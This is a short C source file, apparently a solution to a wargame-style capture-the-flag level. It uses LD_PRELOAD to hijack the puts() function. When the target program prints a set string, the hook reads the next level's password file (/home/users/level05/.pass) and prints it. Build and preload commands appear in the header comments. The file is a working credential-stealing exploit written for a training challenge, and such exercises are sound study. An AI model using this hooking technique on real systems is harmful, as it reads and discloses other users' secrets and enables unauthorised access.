// https://catonmat.net/simple-ld-preload-tutorial-part-two
// gcc -shared -fPIC -ldl exploit04.c -o exploit04.so
// export LD_PRELOAD=/tmp/exploit04.so

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <dlfcn.h>

int puts(const char *string)
{
    if (strcmp(string, "Give me some shellcode, k") == 0)
    {
        char buf[100];
        FILE *fd;

        fd = fopen("/home/users/level05/.pass", "r");
        fread(buf, 1, 100, fd);
        fclose(fd);
        printf("******************************************************\n");
        printf("pass is: %s\n", buf);
        printf("******************************************************\n");
    }
    int (*original_puts)(const char *);
    original_puts = dlsym(RTLD_NEXT, "puts");
    return (*original_puts)(string);
}